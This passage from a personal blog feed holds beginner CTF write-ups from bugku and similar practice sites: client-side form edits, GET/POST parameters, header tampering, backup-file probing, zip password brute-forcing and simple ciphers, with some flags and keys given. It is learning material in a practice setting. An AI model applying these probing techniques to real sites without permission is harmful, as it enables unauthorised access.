src="https://img-blog.csdnimg.cn/20200406231729836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>成功，看效果<img src="https://img-blog.csdnimg.cn/20200406231808496.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>到这里安装全部结束，激动的我赶紧拍个快照<code>留个纪念</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF做题总结之bugku新手篇</title>
      <link href="/2020/08/23/CTF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93%E4%B9%8Bbugku%E6%96%B0%E6%89%8B%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2020/08/23/CTF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93%E4%B9%8Bbugku%E6%96%B0%E6%89%8B%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>因为最近这个新型冠状病毒，无奈只能在家为国家做贡献啦，有多无聊，经历的人都懂，居然学习啦，别说还挺有意思。害！！写了几道题，做个总结笔记吧。</p><h3 id="（一）计算器"><a href="#（一）计算器" class="headerlink" title="（一）计算器"></a>（一）计算器</h3><p>这道题是在bugku的一道web题，进入看到题目，<img src="https://img-blog.csdnimg.cn/20200211150528891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>哎！我去，这么简单，一道小学加法题，然后我就算了一下，秒出答案，自信满满！！！填!!!!然后尴尬了，突然感觉一队乌鸦在头顶飞……噗，，，什么鬼只能填一个数字？？？？<br><img src="https://img-blog.csdnimg.cn/20200211151410905.jpg" alt="在这里插入图片描述" loading="lazy"><br>我cao,还是太年轻。一个一个试，从0<del>9挨个试，因为没有办法，相信好多像我一样的小白都这样试过，虽然知道不可能是对的，但还是要试一下，，哎？你别说，还真是错的，hhh.现在想想它为什么只能填一个数字，emmmmm.之前学过HTML的一点知识，肯定跟代码有关，然后我就右键单击查看源代码，还真找到了，<img src="https://img-blog.csdnimg.cn/20200211152223346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>看来方向是对了，这时候我突然想到一个很致命的问题，噗。。。。我不会改！！！<br>唉！有问题找度娘，找了半天，我最后发现我进入了一个误区，就是我是先查看源代码然后再改的，结果无法修改成功，<strong>解决方法</strong>:直接在题的界面按F12然后修改就可以了，再把那道加法题做出来就行了。<img src="https://img-blog.csdnimg.cn/20200211155632645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>哎，香！！终于做出来了。<br>不过，我还看到有第二种方法，来看<br><img src="https://img-blog.csdnimg.cn/20200211172926981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这道题时验证码而且没有用表单验证，最重要的一个细节是源代码里有两个js文件，打开来看看，第一个<br><img src="https://img-blog.csdnimg.cn/20200211174648320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>我丢，丝毫看不懂。再看第二个<br><img src="https://img-blog.csdnimg.cn/20200211174810342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>哇塞，发现了新大陆。吼吼吼</del>flag藏在这里啦。</p><h3 id="二-web2"><a href="#二-web2" class="headerlink" title="(二)web2"></a>(二)web2</h3><p>一打开这道题看的我有点蒙，哈哈哈，我笑了好多表情，越来越快，逗死了。<br>好了，不闹了，题目说，聪明的人都能找到答案，嘿嘿，我还真的去看了，我看完了，最后变成空白，也还是啥也没找到，当然这是肯定的。那我下一步的想法就是，web题嘛，先看源代码，F12直接搞起，嘿，真别说，还真是让找的<br><img src="https://img-blog.csdnimg.cn/20200211222828451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br> 这里他用HTML里的注释语给注释起来了。</p><h3 id="（三-你必须让他停下"><a href="#（三-你必须让他停下" class="headerlink" title="（三)你必须让他停下"></a>（三)你必须让他停下</h3><p> 这道题哈，说实话，我取巧了，通过传送门进到题目中，画面一直在动，还是那句话，做web题，我现在本能反应就是F12，哈哈哈！仔细观察，我看到<code>flag is here</code>这里我多看了会儿，然后我发现了flag，不过它很快就过去了，我就拿手机在他刚好到flag的时候拍了下来，这个也是一种办法吧。</p><h3 id="（四）web基础-GET"><a href="#（四）web基础-GET" class="headerlink" title="（四）web基础$_GET\"></a>（四）web基础$_GET\</h3><p> 这道题呢，有点熟悉。想起来啦，之前在学校的时候学长教过，当时没做出来，不过再想也是挺简单的。<br> <img src="https://img-blog.csdnimg.cn/20200213144819645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br> 这是一条php语句，意思是如果<code>what=flag</code>就可以打印出来flag。那就来试试<br> 在<code>url</code>中增加<code>?what=flag</code><br> <img src="https://img-blog.csdnimg.cn/20200213145202239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br> flag出来了。</p><h3 id="（五）web基础-POST"><a href="#（五）web基础-POST" class="headerlink" title="（五）web基础$_POST"></a>（五）web基础$_POST</h3><p> 害，这道题虽说简单，知道怎么写的，但是着实费了我好长时间。来看正确做法吧，这个要用到一个插件：火狐里的hackbar，但是这个在新版火狐里要收费了，害，可怜我这穷学生，只能百度去找解决办法了，有好几种解决办法：<br> 1.卸载新火狐，下载个老版本的火狐，最好是2.1.3版本的，害，我个人就喜欢用新的，不喜欢用老的版本，那我只能选择第二种办法啦~<br> 2.找代替品，火狐里还有与他功能相似的插件<img src="https://img-blog.csdnimg.cn/20200213162655549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br> 这里我选择的是第二个，🆗，现在万事俱备，开始解题~哇咔咔<br> <img src="https://img-blog.csdnimg.cn/20200213162854584.png" alt="在这里插入图片描述" loading="lazy"><br> run一下flag就出来了<br> <img src="https://img-blog.csdnimg.cn/20200213162944821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br> ok,这道题也写出来啦，开森，hhh</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF做题笔记(2)+第一次团队内比赛</title>
      <link href="/2020/08/23/CTF%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89+%20%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%9B%A2%E9%98%9F%E5%86%85%E6%AF%94%E8%B5%9B/"/>
      <url>/2020/08/23/CTF%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89+%20%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%9B%A2%E9%98%9F%E5%86%85%E6%AF%94%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>把之前做过的几个题总结了下，这篇博客在草稿箱里待了好久了，也该放出来了。</p><h3 id="明文"><a href="#明文" class="headerlink" title="明文"></a><h3 id="1">明文</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200315152407216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>下载好就是这样一个文件：<br><img src="https://img-blog.csdnimg.cn/20200315152549814.png" alt="在这里插入图片描述" loading="lazy"><br>把它改成压缩包<code>.zip</code>再打开，果然是有东西的<br><img src="https://img-blog.csdnimg.cn/20200315152813306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>打开提示文本<br><img src="https://img-blog.csdnimg.cn/20200315152853632.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>打开压缩包发现了加密的Word文档<br><img src="https://img-blog.csdnimg.cn/20200315161712819.png" alt="在这里插入图片描述" loading="lazy"><br>用ARCHPR暴力破解zip密码<br><img src="https://img-blog.csdnimg.cn/20200315161320330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>密码拿到，<code>hahaha</code>，然后就可以打开那个文档了。<br><img src="https://img-blog.csdnimg.cn/20200315161813410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>一片空白，，接下来让空白的地方显示出来文字<br>找到搜索框，搜索<code>选项</code>两个字，<br><img src="https://img-blog.csdnimg.cn/20200315162225128.png" alt="在这里插入图片描述" loading="lazy"><br>然后找到视图（office的Word文档是显示）<br><img src="https://img-blog.csdnimg.cn/20200315162452784.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后成功拿到flag<br><img src="https://img-blog.csdnimg.cn/2020031516253576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h3 id="Jefferson‘gun（杰弗逊的枪）"><a href="#Jefferson‘gun（杰弗逊的枪）" class="headerlink" title="Jefferson‘gun（杰弗逊的枪）"></a><h3 id="2">Jefferson‘gun（杰弗逊的枪）</h3></h3><p><img src="https://img-blog.csdnimg.cn/2020031516264342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>打开TXT后是这样的，<br><img src="https://img-blog.csdnimg.cn/20200315163037915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这个转轮密码就是根据密钥和密文将上面的13行字符串重新排序。按照密钥的顺序，现在的第二行重新排列后在第一行，其他同样如此，排好之后<img src="https://img-blog.csdnimg.cn/20200315163824541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后再根据密文来修改，密文的意思就是，拿第一行做个例子，在第一行找到N，把它前面的字母全都移到本行的最末尾，组成新的字符串。全部移动之后就是找到倒数第九列（至于为什么，百度我没找到，希望知道这个的大佬能指点一下，十分感谢！）。<br><img src="https://img-blog.csdnimg.cn/20200315164836568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>flag就是这个啦。</p><h3 id="精美壁纸"><a href="#精美壁纸" class="headerlink" title="精美壁纸"></a><h3 id="3">精美壁纸</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200315165053569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br><code>Pixiv@純白可憐.jpg</code>是张图片，打开看看<br><img src="https://img-blog.csdnimg.cn/2020031516593638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>挺好看的，精美壁纸。<br>然后把它拖进winhex里<br><img src="https://img-blog.csdnimg.cn/20200315170159307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>好好检查下，然后在最后发现了信息。<br><img src="https://img-blog.csdnimg.cn/20200315170345563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>题里说了压缩包密码，就找压缩包。<br><img src="https://img-blog.csdnimg.cn/20200315170712241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后查找<code>504B0304</code>,<br><img src="https://img-blog.csdnimg.cn/20200315170817336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>找到了<img src="https://img-blog.csdnimg.cn/20200315170900267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>再找文件尾，zip的文件结尾一般都是`504B0506``开头，在意同样的办法找到文件尾就行。<br>然后提取压缩包<br>选中文件头到文件尾的部分右键单击，选择编辑，然后复制选块<br>，至新文件。<br><img src="https://img-blog.csdnimg.cn/20200315171320908.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后打开保存的压缩包，<br><img src="https://img-blog.csdnimg.cn/20200315173010511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>flag文本加密了，password is picture ID.<br>密码是图片的ID，复制一下 图片的名字，百度一下。<br><img src="https://img-blog.csdnimg.cn/20200315172548616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>进入网页之后找到那张图片，看下它的ID，就是压缩包的密码了<br><img src="https://img-blog.csdnimg.cn/20200315172532890.png" alt="在这里插入图片描述" loading="lazy"><br>打开文本<br><img src="https://img-blog.csdnimg.cn/20200315173227251.png" alt="在这里插入图片描述" loading="lazy"><br>还有密码。这个密码，我做的时候可是好一顿查啊。<br>Unicode转码:<br>hgame{Do_y0u_KnOW_uNiC0d3?}</p><h3 id="Ook"><a href="#Ook" class="headerlink" title="Ook!"></a><h3 id="4">Ook!</h3></h3><p>bugku的一道题，第一眼看见着实吓到我了，自己看看就明白了。<br>不过真的是🐶🐶🐶，弄那么长，吓唬谁呢，纸老虎，在线网址<br><a href="https://tool.bugku.com/brainfuck/">直接破解</a>。没啥说的，啥也不是。</p><h3 id="rot13加密解密"><a href="#rot13加密解密" class="headerlink" title="rot13加密解密"></a><h3 id="5">rot13加密解密</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200316102443460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="网络安全实验室基础题第二道" loading="lazy"><br>做的第一道考察rot13的题目，就是偏移13位的凯撒密码。<br><img src="https://img-blog.csdnimg.cn/20200316102709994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="千千秀字——凯撒密码" loading="lazy"><br>拿到key。</p><h3 id="MD5加密解密"><a href="#MD5加密解密" class="headerlink" title="MD5加密解密"></a><h3 id="6">MD5加密解密</h3></h3><p><img src="https://img-blog.csdnimg.cn/2020031610301915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="网络安全实验室基础题" loading="lazy"><br>直接搜在线解密MD5工具<a href="https://www.cmd5.com/">直达链接</a><br><img src="https://img-blog.csdnimg.cn/20200316103129402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>key：bighp</p><h3 id="种族歧视"><a href="#种族歧视" class="headerlink" title="种族歧视"></a><h3 id="7">种族歧视</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200316103329918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="网络安全实验室" loading="lazy"><br>f12点击控制台，查看一下。<img src="https://img-blog.csdnimg.cn/20200316103446673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>发现没法操作。那就抓包，<br><img src="https://img-blog.csdnimg.cn/20200316103915181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>将这里改成：<code>en-US,en;q=0.9</code>然后go<br><img src="https://img-blog.csdnimg.cn/20200316104251651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>拿到key。</p><h3 id="备份文件"><a href="#备份文件" class="headerlink" title="备份文件"></a><h3 id="8">备份文件</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200316113003278.png" alt="来自攻防世界web新手入门" loading="lazy"><br>开启在线环境，进入之后看到<br><img src="https://img-blog.csdnimg.cn/20200316113105910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>正确姿势：在这里加上<code>/index.php.bak</code><img src="https://img-blog.csdnimg.cn/2020031611332376.png" alt="在这里插入图片描述" loading="lazy"><br>然后会自动下载一个文件，在本地用记事本打开<br><img src="https://img-blog.csdnimg.cn/20200316113702428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>得到flag。<br>常见的文件备份扩展名<br><code>.rar</code>,<code>.zip</code>,<code>.7z</code>,<code>.tar.gz</code>,<code>.bak</code>,<code>.swp</code>,<code>.txt</code>,<code>.html</code></p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a><h3 id="9">cookie</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200316121442553.png" alt="攻防世界web新手入门" loading="lazy"><br>进去后看到“你知道什么是cookie吗？”<br><img src="https://img-blog.csdnimg.cn/20200316121532454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>明显让查看cookie，最简单的办法，f12，到Console（控制台）输入<code>document.cookie</code>，就可以直接看到cookie了，也不用到处找，<br><img src="https://img-blog.csdnimg.cn/20200316122041511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>cookie.php信息提示。然后就把原来的url后面加上<code>cookie.php</code>回车。<img src="https://img-blog.csdnimg.cn/20200316122332167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后就根据提示查看http的response呗。<br><code>f12</code>–<code>Network</code>–<code>Ctrl+R</code>–<code>cookie.php</code>–<code>左键单击</code>然后就能看到flag了<br><img src="https://img-blog.csdnimg.cn/20200316122742147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h3 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a><h3 id="10">simple_js</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200325082756484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>打开后弹了一个窗口，前段时间学过xss 然后就想到了Javascript的弹窗代码<img src="https://img-blog.csdnimg.cn/20200325083009529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>先随便输个密码，<br><img src="https://img-blog.csdnimg.cn/20200325083046673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>再看代码，f12<br><img src="https://img-blog.csdnimg.cn/20200325083214500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>果然是个弹窗的JavaScript代码，一眼就看到了那个很长的一串数字。仔细看就会发现它是十六进制数，先转换，，，<br><img src="https://img-blog.csdnimg.cn/20200325083409439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>将解出来的十进制数对照ascii码表，可以在Excel表格中转换，比较快<br><img src="https://img-blog.csdnimg.cn/20200325084936296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h3 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a><h3 id="11">baby_web</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200325090806399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个提示初始页面，然后看了进入场景看看，<br><img src="https://img-blog.csdnimg.cn/20200325090914758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后呢，，，对于这种，直接f12看源码，然而扫荡一波，什么都没找到。<br>然后再想想提示，初始页面，就是知道是啥，但说不上来那种感觉，然后我就去百度初始页面，刚开始进入浏览器显示的页面，还看到有个大哥在问怎么把百度设置为初始页面呢，这么一看，突然想到刚刚那个url好像有点不对劲，然后对比了一下题目给的url和进入那个链接浏览器显示的url，发现不一样了，多了个<code>/1.php</code>一定是中间跳转了，我之前拿我的物理机当靶机玩xss的时候玩过这个，让用户点击一个链接或者其他的图片之类的东西后直接跳转另一个页面，是反射型xss。<br>这里跳转就burp抓包。<br><img src="https://img-blog.csdnimg.cn/20200325091902101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>右键单击然后转到Repeater里面<br><img src="https://img-blog.csdnimg.cn/20200325092108118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这多好，嘿嘿。</p><h3 id="N种解决方法"><a href="#N种解决方法" class="headerlink" title="N种解决方法"></a><h3 id="12">N种解决方法</h3></h3><p>打开文件是个不能运行的一个应用程序，我就先把它重命名为文本文件了，然后就可以打开了<br><img 